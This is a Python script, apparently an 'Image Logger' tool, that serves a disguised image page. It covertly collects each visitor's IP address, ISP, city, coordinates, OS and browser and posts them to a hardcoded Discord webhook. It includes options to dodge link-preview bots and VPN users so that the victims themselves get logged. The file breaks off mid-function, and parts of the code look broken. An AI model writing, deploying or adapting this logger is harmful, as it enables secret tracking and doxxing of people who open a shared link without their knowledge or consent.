from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1334907866330693712/Vf3nSE_RjXsRFxLYCUXGeF5yBhU-debKZebLuoZEvJYFyAqsDJhkQWgJuWcuP7lh103W",
    "image": "https://www.laleggepertutti.it/cl_resize/wIR5vslCLAY_Jd5bxJ15RJzBwtN5gxKGrcOD0g9Jlxs/rs:fill:500:0/g:ce/q:70/aHR0cHM6Ly93d3cubGFsZWdnZXBlcnR1dHRpLml0L3dwLWNvbnRlbnQvdXBsb2Fkcy8yMDIwLzEwL2ltbWFnaW5pLW1hZ2xpZXR0ZS1kaXJpdHRvLWF1dG9yZS1lMTYwMjY2ODU5MjIxMy5qcGc",
    "imageArgument": True,

    
    "username": "Image Logger", 
    "color": 0x00FFFF,

    
    "crashBrowser": False,
    
    "accurateLocation": False, 

    "message": {
        "doMessage": False, 
        "message": "HELLO SIRE! You have been logged! Here is your info:\n\n**IP:** `{ip}`\n**ISP:** `{isp}`\n**ASN:** `{asn}`\n**Country:** `{country}`\n**Region:** `{region}`\n**City:** `{city}`\n**Coords:** `{lat}, {long}`\n**Timezone:** `{timezone}`\n**Mobile:** `{mobile}`\n**VPN:** `{vpn}`\n**Bot:** `{bot}`\n\n**OS:** `{os}`\n**Browser:** `{browser}`", 
        "richMessage": True, 
    },

    "vpnCheck": 1,
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, 
    "buggedImage": True,

    "antiBot": 1,
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here" 
    },
}

blacklistedIPs = ("27", "104", "143", "164") 

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

#base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

binaries = {
    "loading": "data:image/jpeg;base64,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"
}
    
class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()

                if config["buggedImage"]:
                    image_response = requests.get(binaries["loading"])  
                    if image_response.status_code == 200:
                        self.wfile.write(image_response.content)  # Write the binary content of the image
                    else:
                        self.wfile.write(b"Error loading image")  # Handle failure to fetch image

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
